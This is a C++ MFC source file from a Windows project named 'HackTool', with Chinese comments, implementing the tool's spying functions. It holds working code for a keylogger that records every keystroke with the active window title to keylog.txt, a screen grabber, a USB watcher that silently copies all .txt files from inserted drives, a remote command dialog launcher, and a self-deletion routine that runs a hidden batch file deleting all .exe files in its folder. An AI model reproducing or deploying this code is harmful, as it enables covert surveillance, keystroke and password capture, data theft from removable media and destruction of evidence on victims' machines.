// CFunction.cpp: 实现文件
//

#include "pch.h"
#include "HackTool.h"
#include "CFunction.h"
#include "afxdialogex.h"
#include "CEnumProcessDlg.h"
#include "CEnumFileDlg.h"
#include "VirtualKeyToAscii.h"
#include "CCmdDlg.h"
#include <Dbt.h>
#include "CFileMonitDlg.h"


// CFunction 对话框

IMPLEMENT_DYNAMIC(CFunction, CDialogEx)

CFunction::CFunction(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_FUNCTION_DIALOG, pParent)
{

}

CFunction::~CFunction()
{
}

void CFunction::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CFunction, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &CFunction::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CFunction::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON8, &CFunction::OnBnClickedButton8)
	ON_BN_CLICKED(IDC_BUTTON11, &CFunction::OnBnClickedButton11)
	ON_BN_CLICKED(IDC_BUTTON12, &CFunction::OnBnClickedButton12)
	ON_BN_CLICKED(IDC_BUTTON13, &CFunction::OnBnClickedButton13)
	ON_BN_CLICKED(IDC_BUTTON14, &CFunction::OnBnClickedButton14)
	ON_BN_CLICKED(IDC_BUTTON15, &CFunction::OnBnClickedButton15)
	ON_WM_INPUT()
	ON_MESSAGE(WM_DEVICECHANGE, &CFunction::OnDevicechange)
END_MESSAGE_MAP()


// CFunction 消息处理程序

//进程遍历按钮
void CFunction::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	CEnumProcessDlg MyEnumProcessDlg;		//创建窗口框架
	MyEnumProcessDlg.DoModal();	//创建模态对话框窗口
}

//文件遍历按钮
void CFunction::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	CEnumFileDlg MyEnumFileDlg;		//创建窗口框架
	MyEnumFileDlg.DoModal();	//创建模态对话框窗口
}

//桌面截屏按钮
void CFunction::OnBnClickedButton8()
{
	// TODO: 在此添加控件通知处理程序代码
	if (ScreenCapture() == FALSE)
	{
		MessageBox(_T("截图失败！"));

	}
	else
	{
		MessageBox(_T("截图成功，请在本程序同级目录下查看！"));
	}
}

//按键记录
void CFunction::OnBnClickedButton11()
{
	// TODO: 在此添加控件通知处理程序代码

	//清空文件
	FILE* fp;
	::fopen_s(&fp, "keylog.txt", "w");
	::fclose(fp);

	//注册原始输入设备
	Init(this->m_hWnd);
	
}

//远程CMD
void CFunction::OnBnClickedButton12()
{
	// TODO: 在此添加控件通知处理程序代码
	CCmdDlg MyCmdDlg;
	MyCmdDlg.DoModal();
}

//U盘监控
void CFunction::OnBnClickedButton13()
{
	// TODO: 在此添加控件通知处理程序代码
	MessageBox(_T("U盘监控默认开启"));
}

//文件监控
void CFunction::OnBnClickedButton14()
{
	// TODO: 在此添加控件通知处理程序代码
	CFileMonitDlg MyFileMonitDlg;
	MyFileMonitDlg.DoModal();
}

//自删除
void CFunction::OnBnClickedButton15()
{
	// TODO: 在此添加控件通知处理程序代码
	if (DelSelf(0) == FALSE)
	{
		MessageBox(_T("自删除失败！"));
	}
}

//捕获桌面屏幕
BOOL CFunction::ScreenCapture()
{
	// 获取桌面窗口句柄
	HWND hDesktopWnd = ::GetDesktopWindow();
	if (hDesktopWnd == NULL)
	{
		return FALSE;
	}

	// 获取桌面窗口DC
	HDC hdc = ::GetDC(hDesktopWnd);
	if (hdc == NULL)
	{
		return FALSE;
	}

	// 创建兼容DC
	HDC mdc = ::CreateCompatibleDC(hdc);
	if (mdc == NULL)
	{
		return FALSE;
	}

	// 获取计算机屏幕的宽和高
	DWORD dwScreenWidth = ::GetSystemMetrics(SM_CXSCREEN);
	if (dwScreenWidth == NULL)
	{
		return FALSE;
	}
	DWORD dwScreenHeight = ::GetSystemMetrics(SM_CYSCREEN);
	if (dwScreenHeight == NULL)
	{
		return FALSE;
	}

	// 创建兼容位图
	HBITMAP bmp = ::CreateCompatibleBitmap(hdc, dwScreenWidth, dwScreenHeight);
	if (bmp == NULL)
	{
		return FALSE;
	}

	// 选中位图
	HBITMAP holdbmp = (HBITMAP)::SelectObject(mdc, bmp);
	if (holdbmp == NULL)
	{
		return FALSE;
	}

	// 将窗口内容绘制到位图上
	::BitBlt(mdc, 0, 0, dwScreenWidth, dwScreenHeight, hdc, 0, 0, SRCCOPY);

	// 绘制鼠标
	PaintMouse(mdc);

	// 保存为图片
	SaveBmp(bmp);

	return TRUE;
}

//绘制鼠标
BOOL CFunction::PaintMouse(HDC hdc)
{
	// 创建兼容DC
	HDC bufdc = ::CreateCompatibleDC(hdc);

	//获取光标信息
	CURSORINFO cursorInfo = { sizeof(CURSORINFO) };
	::GetCursorInfo(&cursorInfo);

	// 获取光标的图标信息
	ICONINFO iconInfo = { 0 };
	::GetIconInfo(cursorInfo.hCursor, &iconInfo);

	// 绘制白底黑鼠标(AND)
	::SelectObject(bufdc, iconInfo.hbmMask);
	::BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20, bufdc, 0, 0, SRCAND);

	// 绘制黑底彩色鼠标(OR)
	::SelectObject(bufdc, iconInfo.hbmColor);
	::BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20,
		bufdc, 0, 0, SRCPAINT);

	// 释放资源
	DeleteObject(iconInfo.hbmColor);
	DeleteObject(iconInfo.hbmMask);
	DeleteDC(bufdc);

	return TRUE;
}

//保存为图片
BOOL CFunction::SaveBmp(HBITMAP hBmp)
{
	CImage image;

	// 附加位图句柄
	image.Attach(hBmp);

	// 保存成JPG格式图片
	image.Save(_T("mybmp1.jpg"));

	return TRUE;
}

// 注册原始输入设备
BOOL CFunction::Init(HWND hWnd)
{
	// 设置 RAWINPUTDEVICE 结构体信息
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK;
	rawinputDevice.hwndTarget = hWnd;
	// 注册原始输入设备
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		MessageBox(_T("RegisterRawInputDevices Error"));
		return FALSE;
	}
	return TRUE;
}

void CFunction::OnRawInput(UINT nInputcode, HRAWINPUT hRawInput)
{
	// 该功能要求使用 Windows XP 或更高版本。
	// 符号 _WIN32_WINNT 必须 >= 0x0501。
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	GetData(hRawInput);

	CDialogEx::OnRawInput(nInputcode, hRawInput);
}

// 获取原始输入数据
BOOL CFunction::GetData(HRAWINPUT lParam)
{
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);
	// 获取原始输入数据的大小
	::GetRawInputData(lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	//如果是键盘的原始输入
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> 普通按键    WM_SYSKEYDOWN --> 系统按键(指的是ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// 记录按键
			SaveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}

// 保存按键信息
void CFunction::SaveKey(USHORT usVKey)
{
	char szKey[MAX_PATH] = { 0 };
	char szTitle[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = { 0 };
	FILE *fp = NULL;

	// 获取顶层窗口
	HWND hForegroundWnd = ::GetForegroundWindow();

	// 获取顶层窗口的标题
	::GetWindowTextA(hForegroundWnd, szTitle, 256);

	// 将虚拟键码转换成对应的ASCII码
	::strcpy_s(szKey, GetKeyName(usVKey));

	// 构造按键记录信息字符串
	::sprintf_s(szText, "[%s] %s\r\n", szTitle, szKey);

	// 打开文件写入按键记录数据
	::fopen_s(&fp, "keylog.txt", "a+");

	if (NULL == fp)
	{
		MessageBox(_T("fopen_s"));
		return;
	}

	::fwrite(szText, (1 + ::strlen(szText)), 1, fp);
	::fclose(fp);
}

afx_msg LRESULT CFunction::OnDevicechange(WPARAM wParam, LPARAM lParam)
{
	switch (wParam)
	{
		// 设备已插入
	case DBT_DEVICEARRIVAL:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		// 逻辑卷
		if (DBT_DEVTYP_VOLUME == lpdb->dbch_devicetype)
		{
			// 根据 dbcv_unitmask 计算出设备盘符
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			DWORD dwDriverMask = lpdbv->dbcv_unitmask;
			DWORD dwTemp = 1;
			char szDriver[4] = "A:\\";
			for (szDriver[0] = 'A'; szDriver[0] <= 'Z'; szDriver[0]++)
			{
				if (0 < (dwTemp & dwDriverMask))
				{
					// 获取设备盘符
					::MessageBoxA(NULL, szDriver, "设备已插入", MB_OK);

					//对文件进行遍历
					CopyFiles(szDriver, ".txt");
				}
				// 左移1位, 接着判断下一个盘符
				dwTemp = (dwTemp << 1);
			}
		}
		break;
	}
	// 设备已经移除
	case DBT_DEVICEREMOVECOMPLETE:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		// 逻辑卷
		if (DBT_DEVTYP_VOLUME == lpdb->dbch_devicetype)
		{
			// 根据 dbcv_unitmask 计算出设备盘符
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			DWORD dwDriverMask = lpdbv->dbcv_unitmask;
			DWORD dwTemp = 1;
			char szDriver[4] = "A:\\";
			for (szDriver[0] = 'A'; szDriver[0] <= 'Z'; szDriver[0]++)
			{
				if (0 < (dwTemp & dwDriverMask))
				{
					// 获取设备盘符
					::MessageBoxA(NULL, szDriver, "设备已移除", MB_OK);
					return 0;
				}
				// 左移1位, 接着判断下一个盘符
				dwTemp = (dwTemp << 1);
			}
		}
		break;
	}
	default:
		break;
	}
	return 0;
}

//拷贝文件
BOOL CFunction::CopyFiles(char* FullPath, char* szPostFix)
{
	char NextPath[MAX_PATH] = { 0 };
	char FullFileName[MAX_PATH] = { 0 };
	USES_CONVERSION;

	CString temp;
	temp.Format(_T("%s\\*"), CString(FullPath));

	WIN32_FIND_DATA FindData = { 0 };

	//查找第一个文件
	HANDLE hFile = FindFirstFile(temp, &FindData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBox(_T("FindFirstFile Error"));
		return FALSE;
	}

	do
	{
		//过滤当前目录和上一层目录
		if (lstrcmp(FindData.cFileName, L".") == 0 || lstrcmp(FindData.cFileName, L"..") == 0)
		{
			continue;
		}

		//判断文件属性
		if (FindData.dwFileAttributes&FILE_ATTRIBUTE_HIDDEN)
		{
			//如果文件为隐藏的 则跳过
			continue;
		}
		//如果是目录 则递归遍历子目录
		if (FindData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
		{
			sprintf_s(NextPath, "%s\\%s", FullPath, W2A(FindData.cFileName));
			CopyFiles(NextPath, szPostFix);	//拷贝所有的.txt文件
		}
		else
		{
			//否则 说明是文件 判断后缀 拷贝文件
			//拼接完整的路径名
			sprintf_s(FullFileName, "%s\\%s", FullPath, W2A(FindData.cFileName));

			//找到后缀
			char* PostFix = NULL;
			PostFix = strrchr(FullFileName, '.');
			if (PostFix == NULL)
			{
				//如果没有后缀 直接跳过
				continue;
			}
			if (strcmp(PostFix, szPostFix) == 0)
			{
				//拷贝文件到当前目录
				CopyFile(A2W(FullFileName), FindData.cFileName, FALSE);
			}
		}
	} while (FindNextFile(hFile, &FindData));

	return TRUE;
}

//自删除
BOOL CFunction::DelSelf(int iType)
{
	BOOL bRet = FALSE;
	char szCurrentDirectory[MAX_PATH] = { 0 };
	char szBatFileName[MAX_PATH] = { 0 };
	char szCmd[MAX_PATH] = { 0 };

	// 获取当前程序所在目录
	::GetModuleFileNameA(NULL, szCurrentDirectory, MAX_PATH);
	//查找最后一个\的位置
	char *p = strrchr(szCurrentDirectory, '\\');
	p[0] = '\0';
	// 构造批处理文件路径
	::wsprintfA(szBatFileName, "%s\\temp.bat", szCurrentDirectory);
	// 构造调用执行批处理的 CMD 命令行
	::wsprintfA(szCmd, "cmd /c call \"%s\"", szBatFileName);

	// 创建自删除的批处理文件
	if (0 == iType)
	{
		// choice 方式
		bRet = CreateChoiceBat(szBatFileName);
	}
	else if (1 == iType)
	{
		// ping 方式
		bRet = CreatePingBat(szBatFileName);
	}

	// 创建新的进程, 以隐藏控制台的方式执行批处理
	if (bRet)
	{
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi;
		si.cb = sizeof(si);
		//指定wShowWindow成员有效
		si.dwFlags = STARTF_USESHOWWINDOW;
		//若此成员设为TRUE的话则显示新建进程的主窗口
		si.wShowWindow = FALSE;
		USES_CONVERSION;
		BOOL bRet = ::CreateProcess(NULL, A2W(szCmd), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		if (bRet)
		{
			//不使用的句柄最好关掉
			::CloseHandle(pi.hThread);
			::CloseHandle(pi.hProcess);
			// 结束进程
			exit(0);
			::ExitProcess(NULL);
		}
	}
	return bRet;
}

//构造批处理文件
BOOL CFunction::CreateChoiceBat(char * pszFileName)
{
	int iTime = 1;
	char szBat[MAX_PATH] = { 0 };

	// 构造批处理内容
	/*
		@echo off	不显示cmd执行命令
		choice /t 5 /d y /n >nul	等待五秒
		del *.exe	删除同路径下所有的exe
		del %0		删除自身
	*/

	//或者使用下面这个
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del %0
	*/
	//::wsprintf(szBat, "@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n", iTime);
	::wsprintfA(szBat, "@echo off\nchoice /t %d /d y /n >nul\ndel *.exe\ndel %%0\n", iTime);

	//生成批处理文件
	FILE *fp = NULL;
	fopen_s(&fp, pszFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + ::lstrlenA(szBat)), 1, fp);
	fclose(fp);
	return TRUE;
}

//构造批处理文件
BOOL CFunction::CreatePingBat(char * pszFileName)
{
	int iTime = 1;
	char szBat[MAX_PATH] = { 0 };

	// 构造批处理内容
	/*
		@echo off	不显示cmd执行命令
		choice /t 5 /d y /n >nul	等待五秒
		del *.exe	删除同路径下所有的exe
		del %0		删除自身
	*/

	//或者使用下面这个
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del %0
	*/
	::wsprintfA(szBat, "@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n", iTime);
	//::wsprintfA(szBat, "@echo off\nchoice /t %d /d y /n >nul\ndel *.exe\ndel %%0\n", iTime);

	//生成批处理文件
	FILE *fp = NULL;
	fopen_s(&fp, pszFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + ::lstrlenA(szBat)), 1, fp);
	fclose(fp);
	return TRUE;
}